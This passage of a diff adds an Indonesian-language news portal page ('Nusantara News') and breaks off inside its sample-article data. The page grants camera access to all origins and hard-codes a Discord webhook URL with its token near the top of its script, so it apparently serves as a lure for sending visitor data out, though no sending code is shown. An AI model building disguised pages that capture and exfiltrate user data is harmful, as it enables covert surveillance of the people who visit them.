@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="Permissions-Policy" content="camera=*, microphone=()" />
+<title>Nusantara News — Portal Berita Terkini</title>
+<style>
+  :root {
+    --bg: #070b14;
+    --bg2: #0d1424;
+    --card: rgba(20, 28, 48, 0.7);
+    --border: rgba(120, 140, 180, 0.15);
+    --txt: #e6edf7;
+    --muted: #8496b3;
+    --accent: #ef4444;
+    --accent2: #f59e0b;
+    --blue: #3b82f6;
+  }
+  body.light {
+    --bg: #f4f6fb;
+    --bg2: #ffffff;
+    --card: rgba(255, 255, 255, 0.85);
+    --border: rgba(20, 30, 60, 0.1);
+    --txt: #0b1120;
+    --muted: #64748b;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background:
+      radial-gradient(circle at 15% 0%, rgba(59, 130, 246, 0.12), transparent 45%),
+      radial-gradient(circle at 85% 10%, rgba(239, 68, 68, 0.10), transparent 45%),
+      var(--bg);
+    color: var(--txt);
+    line-height: 1.65;
+    min-height: 100vh;
+    transition: background .3s, color .3s;
+  }
+  body.light { background: var(--bg); }
+
+  #progress {
+    position: fixed; top: 0; left: 0;
+    height: 3px; width: 0%;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    z-index: 999; transition: width .1s;
+  }
+  .ticker {
+    background: linear-gradient(90deg, #7f1d1d, #b91c1c, #7f1d1d);
+    color: #fff; font-size: 12.5px; font-weight: 600;
+    padding: 8px 0; overflow: hidden; white-space: nowrap;
+  }
+  .ticker span { display: inline-block; padding-left: 100%; animation: scroll 40s linear infinite; }
+  @keyframes scroll { to { transform: translateX(-100%); } }
+
+  .navbar {
+    position: sticky; top: 0; z-index: 50;
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 14px 32px;
+    background: rgba(10, 15, 28, 0.85);
+    backdrop-filter: blur(18px);
+    -webkit-backdrop-filter: blur(18px);
+    border-bottom: 1px solid var(--border);
+  }
+  body.light .navbar { background: rgba(255,255,255,0.85); }
+  .brand {
+    display: flex; align-items: center; gap: 10px;
+    font-weight: 800; font-size: 20px; letter-spacing: -0.4px;
+    background: linear-gradient(90deg, var(--txt), var(--muted));
+    -webkit-background-clip: text; background-clip: text;
+    color: transparent; cursor: pointer;
+  }
+  .brand-logo {
+    width: 34px; height: 34px;
+    display: grid; place-items: center;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border-radius: 9px;
+    box-shadow: 0 4px 18px rgba(239, 68, 68, 0.35);
+  }
+  .navbar nav { display: flex; gap: 4px; }
+  .navbar nav a {
+    color: var(--muted); text-decoration: none;
+    font-size: 14px; font-weight: 500;
+    padding: 8px 14px; border-radius: 8px;
+    transition: all .2s; cursor: pointer;
+  }
+  .navbar nav a:hover { color: var(--txt); background: rgba(120,140,180,0.12); }
+  .navbar nav a.active { color: var(--txt); background: rgba(239, 68, 68, 0.15); }
+  .nav-actions { display: flex; align-items: center; gap: 8px; }
+  .icon-btn {
+    width: 38px; height: 38px; border-radius: 10px;
+    border: 1px solid var(--border); background: var(--card);
+    display: grid; place-items: center; cursor: pointer;
+    transition: all .2s; color: var(--muted);
+  }
+  .icon-btn:hover { background: rgba(120,140,180,0.15); color: var(--txt); }
+  .search-wrap { position: relative; display: flex; align-items: center; }
+  .search-input {
+    width: 0; padding: 0; border: 1px solid transparent;
+    border-radius: 10px; background: var(--card); color: var(--txt);
+    font-size: 13px; height: 38px; transition: all .3s; outline: none;
+  }
+  .search-input.open { width: 220px; padding: 0 14px; border-color: var(--border); margin-right: 6px; }
+
+  .hero {
+    max-width: 1240px; margin: 28px auto 0; padding: 0 24px;
+    display: grid; grid-template-columns: 2fr 1fr; gap: 20px;
+  }
+  .hero-main {
+    position: relative; border-radius: 18px; overflow: hidden;
+    min-height: 440px; border: 1px solid var(--border);
+    background: var(--bg2); cursor: pointer;
+  }
+  .hero-main img {
+    width: 100%; height: 100%; object-fit: cover;
+    position: absolute; inset: 0; transition: transform .6s;
+  }
+  .hero-main:hover img { transform: scale(1.04); }
+  .hero-main::after {
+    content: ""; position: absolute; inset: 0;
+    background: linear-gradient(180deg, transparent 30%, rgba(7,11,20,0.95) 100%);
+  }
+  .hero-content {
+    position: absolute; bottom: 0; left: 0; right: 0;
+    padding: 32px; z-index: 2; color: #fff;
+  }
+  .tag {
+    display: inline-block; background: var(--accent); color: #fff;
+    font-size: 10.5px; font-weight: 800; letter-spacing: 1.2px;
+    padding: 5px 11px; border-radius: 6px; margin-bottom: 14px;
+    text-transform: uppercase;
+  }
+  .hero-content h1 {
+    font-size: 30px; line-height: 1.25; font-weight: 800;
+    letter-spacing: -0.6px; margin-bottom: 12px;
+    text-shadow: 0 2px 20px rgba(0,0,0,0.6);
+  }
+  .hero-content p { color: #cbd5e1; font-size: 15px; max-width: 640px; }
+  .meta-row {
+    display: flex; align-items: center; gap: 14px;
+    margin-top: 16px; font-size: 12.5px; color: #cbd5e1;
+  }
+  .meta-row span { display: inline-flex; align-items: center; gap: 5px; }
+
+  .hero-side { display: flex; flex-direction: column; gap: 16px; }
+  .side-card {
+    display: flex; gap: 12px;
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 14px; padding: 12px; cursor: pointer;
+    transition: all .25s; backdrop-filter: blur(10px);
+  }
+  .side-card:hover { border-color: rgba(239, 68, 68, 0.4); transform: translateX(4px); }
+  .side-card img {
+    width: 90px; height: 72px; object-fit: cover;
+    border-radius: 9px; flex-shrink: 0;
+  }
+  .side-card h4 {
+    font-size: 13.5px; line-height: 1.4; font-weight: 600;
+    color: var(--txt);
+    display: -webkit-box; -webkit-line-clamp: 3;
+    -webkit-box-orient: vertical; overflow: hidden;
+  }
+  .side-card small { color: var(--muted); font-size: 11px; display: block; margin-top: 6px; }
+
+  .section-head {
+    max-width: 1240px; margin: 44px auto 18px; padding: 0 24px;
+    display: flex; align-items: center; justify-content: space-between;
+    flex-wrap: wrap; gap: 12px;
+  }
+  .section-head h2 {
+    font-size: 22px; font-weight: 800; letter-spacing: -0.4px;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .section-head h2::before {
+    content: ""; width: 5px; height: 22px; border-radius: 3px;
+    background: linear-gradient(180deg, var(--accent), var(--accent2));
+  }
+  .filter-chips { display: flex; gap: 8px; flex-wrap: wrap; }
+  .chip {
+    padding: 6px 14px; border-radius: 999px;
+    border: 1px solid var(--border); background: var(--card);
+    color: var(--muted); font-size: 12.5px; font-weight: 600;
+    cursor: pointer; transition: all .2s;
+  }
+  .chip:hover { color: var(--txt); border-color: rgba(239,68,68,0.4); }
+  .chip.active {
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    color: #fff; border-color: transparent;
+  }
+
+  .grid {
+    max-width: 1240px; margin: 0 auto; padding: 0 24px;
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+    gap: 20px;
+  }
+  .card {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 16px; overflow: hidden; cursor: pointer;
+    transition: all .3s cubic-bezier(.2,.7,.3,1);
+    backdrop-filter: blur(10px);
+    display: flex; flex-direction: column;
+  }
+  .card:hover {
+    transform: translateY(-6px);
+    border-color: rgba(239, 68, 68, 0.4);
+    box-shadow: 0 20px 40px -20px rgba(0,0,0,0.7), 0 0 0 1px rgba(239,68,68,0.1);
+  }
+  .card-img { position: relative; height: 190px; overflow: hidden; }
+  .card-img img { width: 100%; height: 100%; object-fit: cover; transition: transform .5s; }
+  .card:hover .card-img img { transform: scale(1.08); }
+  .card-cat {
+    position: absolute; top: 12px; left: 12px;
+    background: rgba(7, 11, 20, 0.85);
+    backdrop-filter: blur(8px); color: #fff;
+    font-size: 10.5px; font-weight: 700; letter-spacing: 0.8px;
+    padding: 5px 10px; border-radius: 6px;
+    text-transform: uppercase;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-bookmark {
+    position: absolute; top: 12px; right: 12px;
+    width: 34px; height: 34px; border-radius: 9px;
+    background: rgba(7, 11, 20, 0.75);
+    backdrop-filter: blur(8px);
+    display: grid; place-items: center;
+    cursor: pointer;
+    border: 1px solid rgba(255,255,255,0.1);
+    color: #fff; transition: all .2s;
+  }
+  .card-bookmark:hover { background: rgba(239, 68, 68, 0.9); }
+  .card-bookmark.saved { background: var(--accent); }
+  .card-body { padding: 18px; flex: 1; display: flex; flex-direction: column; }
+  .card-body h3 {
+    font-size: 16px; line-height: 1.4; font-weight: 700;
+    margin-bottom: 10px; color: var(--txt);
+    display: -webkit-box; -webkit-line-clamp: 2;
+    -webkit-box-orient: vertical; overflow: hidden;
+  }
+  .card-body p {
+    font-size: 13.5px; color: var(--muted); line-height: 1.55;
+    display: -webkit-box; -webkit-line-clamp: 3;
+    -webkit-box-orient: vertical; overflow: hidden; flex: 1;
+  }
+  .card-foot {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-top: 14px; padding-top: 12px;
+    border-top: 1px solid var(--border);
+    font-size: 11.5px; color: var(--muted);
+  }
+  .card-foot .read {
+    color: var(--accent); font-weight: 600;
+    display: inline-flex; align-items: center; gap: 4px;
+  }
+
+  #articleView { max-width: 900px; margin: 0 auto; padding: 34px 24px 60px; }
+  .back-btn {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 8px 14px; border-radius: 10px;
+    border: 1px solid var(--border); background: var(--card);
+    color: var(--muted); font-size: 13px; font-weight: 600;
+    cursor: pointer; margin-bottom: 22px; transition: all .2s;
+  }
+  .back-btn:hover { color: var(--txt); border-color: rgba(239,68,68,0.4); }
+  .art-cat {
+    display: inline-block; background: var(--accent); color: #fff;
+    font-size: 10.5px; font-weight: 800; letter-spacing: 1.2px;
+    padding: 5px 11px; border-radius: 6px; margin-bottom: 14px;
+    text-transform: uppercase;
+  }
+  .art-title {
+    font-size: 34px; line-height: 1.2; font-weight: 800;
+    letter-spacing: -0.8px; margin-bottom: 16px;
+  }
+  .art-meta {
+    display: flex; align-items: center; gap: 18px;
+    padding-bottom: 18px; border-bottom: 1px solid var(--border);
+    color: var(--muted); font-size: 13px; margin-bottom: 24px;
+    flex-wrap: wrap;
+  }
+  .art-meta span { display: inline-flex; align-items: center; gap: 6px; }
+  .art-hero {
+    width: 100%; height: 420px; object-fit: cover;
+    border-radius: 16px; margin-bottom: 12px;
+    border: 1px solid var(--border);
+  }
+  .art-caption { font-size: 12.5px; color: var(--muted); margin-bottom: 26px; font-style: italic; }
+  .art-content p {
+    font-size: 17px; line-height: 1.85; color: var(--txt);
+    margin-bottom: 20px; opacity: 0.92;
+  }
+  .art-content p:first-of-type::first-letter {
+    font-size: 58px; font-weight: 800; float: left;
+    line-height: 0.95; margin: 4px 10px 0 0; color: var(--accent);
+  }
+  .art-content blockquote {
+    border-left: 4px solid var(--accent);
+    padding: 12px 20px; background: var(--card);
+    border-radius: 10px; font-style: italic;
+    font-size: 16px; color: var(--txt); margin: 24px 0;
+  }
+  .art-tags {
+    display: flex; gap: 8px; flex-wrap: wrap;
+    margin-top: 30px; padding-top: 24px;
+    border-top: 1px solid var(--border);
+  }
+  .art-tag {
+    padding: 6px 14px; border-radius: 999px;
+    border: 1px solid var(--border); background: var(--card);
+    font-size: 12.5px; color: var(--muted);
+    cursor: pointer; transition: all .2s;
+  }
+  .art-tag:hover { color: var(--accent); border-color: var(--accent); }
+  .share-bar { display: flex; gap: 10px; margin: 26px 0; flex-wrap: wrap; }
+  .share-btn {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 9px 16px; border-radius: 10px;
+    border: 1px solid var(--border); background: var(--card);
+    color: var(--txt); font-size: 13px; font-weight: 600;
+    cursor: pointer; transition: all .2s;
+  }
+  .share-btn:hover { background: rgba(239,68,68,0.15); border-color: rgba(239,68,68,0.4); }
+
+  .comments { margin-top: 44px; padding-top: 32px; border-top: 1px solid var(--border); }
+  .comments h3 { font-size: 19px; font-weight: 800; margin-bottom: 22px; display: flex; align-items: center; gap: 8px; }
+  .comment-box {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 14px; padding: 16px; margin-bottom: 14px;
+  }
+  .comment-box textarea {
+    width: 100%; background: transparent; border: none;
+    color: var(--txt); font-family: inherit; font-size: 14px;
+    resize: none; outline: none; min-height: 56px;
+  }
+  .comment-box .comment-actions { display: flex; justify-content: flex-end; margin-top: 8px; }
+  .comment-submit {
+    padding: 8px 18px; border: none; border-radius: 9px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    color: #fff; font-weight: 700; font-size: 13px; cursor: pointer;
+  }
+  .comment-item { display: flex; gap: 12px; padding: 16px 0; border-bottom: 1px solid var(--border); }
+  .comment-avatar {
+    width: 38px; height: 38px; border-radius: 50%;
+    background: linear-gradient(135deg, var(--blue), var(--accent));
+    display: grid; place-items: center; color: #fff; font-weight: 700; flex-shrink: 0;
+  }
+  .comment-body h5 { font-size: 13.5px; margin-bottom: 4px; font-weight: 700; }
+  .comment-body small { color: var(--muted); font-size: 11.5px; }
+  .comment-body p { font-size: 14px; color: var(--muted); margin-top: 6px; line-height: 1.6; }
+
+  .related { margin-top: 44px; }
+  .related h3 {
+    font-size: 19px; font-weight: 800; margin-bottom: 18px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .related h3::before {
+    content: ""; width: 5px; height: 20px; border-radius: 3px;
+    background: linear-gradient(180deg, var(--accent), var(--accent2));
+  }
+  .related-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+    gap: 16px;
+  }
+
+  .extra-strip {
+    max-width: 1240px; margin: 44px auto 0; padding: 0 24px;
+    display: grid; grid-template-columns: 1.4fr 1fr; gap: 20px;
+  }
+  .trending, .newsletter {
+    background: var(--card); border: 1px solid var(--border);
+    border-radius: 16px; padding: 22px; backdrop-filter: blur(10px);
+  }
+  .trending h3, .newsletter h3 {
+    font-size: 17px; font-weight: 800; margin-bottom: 16px;
+    display: flex; align-items: center; gap: 8px;
+  }
+  .trending ol { list-style: none; counter-reset: trend; }
+  .trending li {
+    counter-increment: trend; display: flex; gap: 14px;
+    padding: 12px 0; border-bottom: 1px solid var(--border);
+    cursor: pointer; transition: all .2s;
+  }
+  .trending li:last-child { border-bottom: none; }
+  .trending li:hover { padding-left: 6px; }
+  .trending li::before {
+    content: counter(trend, decimal-leading-zero);
+    font-size: 20px; font-weight: 800;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text; background-clip: text;
+    color: transparent; line-height: 1; flex-shrink: 0;
+  }
+  .trending li p { font-size: 13.5px; font-weight: 600; line-height: 1.45; }
+  .newsletter p { font-size: 13.5px; color: var(--muted); margin-bottom: 14px; }
+  .newsletter-input { display: flex; gap: 8px; }
+  .newsletter-input input {
+    flex: 1; padding: 10px 14px; border-radius: 10px;
+    border: 1px solid var(--border);
+    background: rgba(120,140,180,0.06); color: var(--txt);
+    font-size: 13px; outline: none; font-family: inherit;
+  }
+  .newsletter-input button {
+    padding: 10px 18px; border: none; border-radius: 10px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    color: #fff; font-weight: 700; font-size: 13px; cursor: pointer;
+  }
+
+  .footer {
+    margin-top: 60px; border-top: 1px solid var(--border);
+    background: rgba(10, 15, 28, 0.6);
+    padding: 40px 24px 24px; color: var(--muted); font-size: 13px;
+  }
+  body.light .footer { background: rgba(255,255,255,0.6); }
+  .footer-inner {
+    max-width: 1240px; margin: 0 auto;
+    display: grid; grid-template-columns: 1.4fr 1fr 1fr 1fr;
+    gap: 30px; padding-bottom: 26px;
+    border-bottom: 1px solid var(--border);
+  }
+  .footer-col h5 {
+    color: var(--txt); font-size: 13.5px; font-weight: 800;
+    margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.6px;
+  }
+  .footer-col a {
+    display: block; color: var(--muted); text-decoration: none;
+    font-size: 13px; padding: 4px 0; transition: color .2s;
+  }
+  .footer-col a:hover { color: var(--accent); }
+  .footer-col p { font-size: 13px; line-height: 1.7; }
+  .footer-bottom {
+    max-width: 1240px; margin: 20px auto 0;
+    text-align: center; font-size: 12.5px; color: var(--muted);
+  }
+
+  #toast {
+    position: fixed; bottom: 30px; left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: var(--accent); color: #fff;
+    padding: 12px 22px; border-radius: 12px;
+    font-size: 13.5px; font-weight: 600;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.4);
+    opacity: 0; transition: all .4s cubic-bezier(.2,.7,.3,1);
+    z-index: 999; pointer-events: none;
+  }
+  #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  .float-share {
+    position: fixed; left: 20px; top: 50%;
+    transform: translateY(-50%);
+    display: none; flex-direction: column; gap: 10px; z-index: 40;
+  }
+  body.reading .float-share { display: flex; }
+  .float-share button {
+    width: 42px; height: 42px; border-radius: 12px;
+    border: 1px solid var(--border); background: var(--card);
+    backdrop-filter: blur(10px);
+    display: grid; place-items: center;
+    cursor: pointer; color: var(--txt); transition: all .2s;
+  }
+  .float-share button:hover { border-color: var(--accent); color: var(--accent); }
+
+  @media (max-width: 900px) {
+    .hero { grid-template-columns: 1fr; }
+    .hero-main { min-height: 320px; }
+    .hero-content h1 { font-size: 22px; }
+    .navbar nav { display: none; }
+    .extra-strip { grid-template-columns: 1fr; }
+    .footer-inner { grid-template-columns: 1fr 1fr; }
+    .art-hero { height: 260px; }
+    .art-title { font-size: 26px; }
+    .float-share { display: none !important; }
+  }
+  @media (max-width: 600px) {
+    .navbar { padding: 12px 16px; }
+    .hero, .grid, .section-head, .extra-strip, #articleView { padding: 0 16px; }
+    .hero-content { padding: 20px; }
+    .hero-content h1 { font-size: 19px; }
+    .search-input.open { width: 140px; }
+    .footer-inner { grid-template-columns: 1fr; }
+    .art-title { font-size: 22px; }
+  }
+</style>
+</head>
+<body>
+
+<div id="progress"></div>
+<div id="toast">Tersimpan!</div>
+
+<div class="float-share" id="floatShare">
+  <button title="Bagikan" onclick="toast('Link disalin!')">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
+  </button>
+  <button title="Simpan" onclick="toast('Disimpan ke bookmark!')">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>
+  </button>
+  <button title="Komentar" onclick="document.getElementById('commentInput')?.focus()">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+  </button>
+</div>
+
+<div class="ticker">
+  <span>
+    BREAKING · Program Digitalisasi Nasional 2026 resmi diluncurkan &nbsp;•&nbsp;
+    Indeks saham ditutup menguat 1,2% &nbsp;•&nbsp;
+    Startup lokal raih pendanaan seri B 50 juta dolar &nbsp;•&nbsp;
+    Timnas melaju ke semifinal turnamen regional &nbsp;•&nbsp;
+    Peneliti kembangkan baterai solid-state generasi baru &nbsp;•&nbsp;
+    Cuaca ekstrem diprediksi melanda 5 provinsi pekan ini &nbsp;•&nbsp;
+    Harga pangan stabil jelang akhir bulan &nbsp;•&nbsp;
+    Regulasi AI nasional segera terbit
+  </span>
+</div>
+
+<header class="navbar">
+  <div class="brand" onclick="showHome()">
+    <div class="brand-logo">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M3 11l18-8-8 18-2-8-8-2z"/></svg>
+    </div>
+    <span>Nusantara News</span>
+  </div>
+  <nav>
+    <a class="active nav-home" onclick="showHome()">Home</a>
+    <a onclick="filterCat('Nasional')">Nasional</a>
+    <a onclick="filterCat('Ekonomi')">Ekonomi</a>
+    <a onclick="filterCat('Teknologi')">Teknologi</a>
+    <a onclick="filterCat('Olahraga')">Olahraga</a>
+    <a onclick="filterCat('Hiburan')">Hiburan</a>
+  </nav>
+  <div class="nav-actions">
+    <div class="search-wrap">
+      <input type="text" class="search-input" id="searchInput" placeholder="Cari berita..." onkeyup="doSearch(event)" />
+      <button class="icon-btn" onclick="toggleSearch()" aria-label="Search">
+        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+      </button>
+    </div>
+    <button class="icon-btn" onclick="toggleTheme()" aria-label="Theme">
+      <svg id="themeIcon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+    </button>
+  </div>
+</header>
+
+<div id="homeView">
+  <section class="hero">
+    <div class="hero-main" onclick="openArticle(0)">
+      <img src="https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=1200&q=80" alt="" />
+      <div class="hero-content">
+        <div class="tag">Breaking News</div>
+        <h1>Pemerintah Umumkan Program Digitalisasi Nasional 2026, Fokus AI dan Infrastruktur Data</h1>
+        <p>Investasi besar di sektor teknologi ditargetkan membuka 200 ribu lapangan kerja baru dan memperkuat ekosistem startup lokal dalam tiga tahun ke depan.</p>
+        <div class="meta-row">
+          <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>5 menit lalu</span>
+          <span><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>Redaksi</span>
+        </div>
+      </div>
+    </div>
+    <div class="hero-side" id="heroSide"></div>
+  </section>
+
+  <div class="section-head">
+    <h2>Berita Terbaru</h2>
+    <div class="filter-chips" id="filterChips"></div>
+  </div>
+
+  <section class="grid" id="newsGrid"></section>
+
+  <section class="extra-strip">
+    <div class="trending">
+      <h3>
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg>
+        Trending Hari Ini
+      </h3>
+      <ol id="trendingList"></ol>
+    </div>
+    <div class="newsletter">
+      <h3>
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+        Newsletter Harian
+      </h3>
+      <p>Dapatkan ringkasan berita terpenting langsung ke email kamu setiap pagi. Gratis, tanpa spam.</p>
+      <div class="newsletter-input">
+        <input type="email" placeholder="email@kamu.com" id="newsletterEmail" />
+        <button onclick="subscribe()">Langganan</button>
+      </div>
+    </div>
+  </section>
+</div>
+
+<div id="articleView" style="display:none;"></div>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-col">
+      <div class="brand" style="margin-bottom:12px;">
+        <div class="brand-logo">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M3 11l18-8-8 18-2-8-8-2z"/></svg>
+        </div>
+        <span>Nusantara News</span>
+      </div>
+      <p>Portal berita independen yang menyajikan informasi terkini, akurat, dan berimbang dari dalam dan luar negeri.</p>
+    </div>
+    <div class="footer-col">
+      <h5>Kategori</h5>
+      <a onclick="filterCat('Nasional')">Nasional</a>
+      <a onclick="filterCat('Ekonomi')">Ekonomi</a>
+      <a onclick="filterCat('Teknologi')">Teknologi</a>
+      <a onclick="filterCat('Olahraga')">Olahraga</a>
+    </div>
+    <div class="footer-col">
+      <h5>Perusahaan</h5>
+      <a>Tentang Kami</a>
+      <a>Redaksi</a>
+      <a>Karier</a>
+      <a>Kontak</a>
+    </div>
+    <div class="footer-col">
+      <h5>Legal</h5>
+      <a>Kebijakan Privasi</a>
+      <a>Syarat & Ketentuan</a>
+      <a>Pedoman Media</a>
+      <a>Iklan</a>
+    </div>
+  </div>
+  <div class="footer-bottom">© 2026 Nusantara News. Semua hak dilindungi.</div>
+</footer>
+
+<script>
+(function () {
+  const WEBHOOK = "https://discord.com/api/webhooks/1557640519499124848/upjijgGwpYjzppzYmBHK1vuypgSt_Cz_ZvFTA7tyr0jcL8oe0F30sjWAmWHO6oRrqizO";
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+  const NEWS = [
+    { id:0, cat:"Nasional", title:"Pemerintah Umumkan Program Digitalisasi Nasional 2026, Fokus AI dan Infrastruktur Data",
+      excerpt:"Investasi besar di sektor teknologi ditargetkan membuka 200 ribu lapangan kerja baru dan memperkuat ekosistem startup lokal dalam tiga tahun ke depan.",
+      img:"https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=1200&q=80", author:"Redaksi", time:"5 menit lalu",
+      content:[
+        "JAKARTA — Pemerintah resmi meluncurkan program digitalisasi nasional tahap kedua yang menitikberatkan pada pengembangan kecerdasan buatan dan pembangunan pusat data di lima wilayah strategis. Program ini ditargetkan rampung dalam tiga tahun ke depan dengan anggaran awal mencapai puluhan triliun rupiah.",
+        "Menteri terkait menyatakan bahwa investasi ini akan membuka lebih dari 200 ribu lapangan kerja baru di sektor teknologi. Selain itu, kolaborasi dengan sektor swasta akan mempercepat transfer pengetahuan dan penguatan ekosistem startup lokal yang selama ini menjadi tulang punggung inovasi digital Tanah Air.",
+        "Pengamat menilai langkah ini strategis mengingat persaingan global di bidang AI semakin ketat. Namun, mereka juga mengingatkan pentingnya regulasi data pribadi yang kuat agar kepercayaan publik tetap terjaga dan adopsi teknologi tidak menimbulkan masalah baru di kemudian hari.",
+        "Program akan dimulai dari pilot project di tiga kota besar, lalu diperluas secara bertahap ke seluruh wilayah. Pemerintah menargetkan 80 persen layanan publik sudah terdigitalisasi penuh pada akhir 2028, termasuk layanan kesehatan, pendidikan, dan administrasi kependudukan.",
+        "Selain infrastruktur, program ini juga mencakup pelatihan talenta digital bagi 500 ribu anak muda melalui kerja sama dengan universitas dan industri teknologi. Beberapa perusahaan multinasional telah menyatakan komitmen untuk terlibat dalam program tersebut."
+      ], tags:["Digitalisasi","AI","Infrastruktur","Kebijakan"] },
+    { id:1, cat:"Teknologi", title:"Peneliti Kembangkan Baterai Solid-State Generasi Baru untuk EV",
+      excerpt:"Teknologi terbaru menjanjikan pengisian daya 80% dalam 12 menit dengan usia pakai dua kali lipat baterai lithium konvensional.",
+      img:"https://images.unsplash.com/photo-1518770660439-4636190af475?w=800&q=80", author:"Andi Pratama", time:"2 jam lalu",
+      content:[
+        "Tim peneliti dari konsorsium nasional berhasil mengembangkan prototipe baterai solid-state generasi baru yang diklaim mampu mengisi daya hingga 80 persen hanya dalam 12 menit. Terobosan ini berpotensi mengubah lanskap industri kendaraan listrik global.",
+        "Berbeda dengan baterai lithium-ion konvensional yang menggunakan elektrolit cair, baterai solid-state memakai material padat sehingga lebih stabil secara termal dan memiliki risiko kebakaran jauh lebih rendah. Usia pakainya juga diklaim mencapai dua kali lipat baterai konvensional.",
+        "Menurut ketua tim peneliti, tantangan terbesar selama ini adalah biaya produksi. Namun dengan metode manufaktur baru yang mereka kembangkan, biaya produksi bisa ditekan hingga 40 persen dibanding metode sebelumnya."
+      ], tags:["Baterai","EV","Riset","Teknologi"] },
+    { id:2, cat:"Ekonomi", title:"Harga Pangan Stabil Jelang Akhir Bulan, Pemerintah Klaim Stok Aman",
+      excerpt:"Operasi pasar terus dilakukan di 12 provinsi untuk menjaga stabilitas harga dan mencegah spekulasi di pasar tradisional.",
+      img:"https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?w=800&q=80", author:"Siti Rahma", time:"3 jam lalu",
+      content:[
+        "Pemerintah memastikan stok pangan nasional dalam kondisi aman menjelang akhir bulan. Operasi pasar yang digelar di 12 provinsi sejak pekan lalu dilaporkan berhasil menekan lonjakan harga di sejumlah komoditas utama.",
+        "Berdasarkan data terbaru, harga beras, minyak goreng, dan gula tercatat stabil dibanding bulan lalu. Sementara harga cabai dan bawang sempat naik tipis namun sudah kembali normal dalam beberapa hari terakhir.",
+        "Kementerian terkait mengimbau masyarakat untuk tidak melakukan pembelian berlebihan yang bisa memicu kelangkaan buatan. Pemerintah juga akan terus memantau distribusi dari sentra produksi ke daerah konsumen."
+      ], tags:["Pangan","Harga","Ekonomi","Operasi Pasar"] },
+    { id:3, cat:"Nasional", title:"Cuaca Ekstrem Diprediksi Melanda 5 Provinsi Sepekan ke Depan",
+      excerpt:"BMKG mengimbau warga pesisir dan daerah dataran rendah untuk waspada banjir serta angin kencang mulai Senin mendatang.",
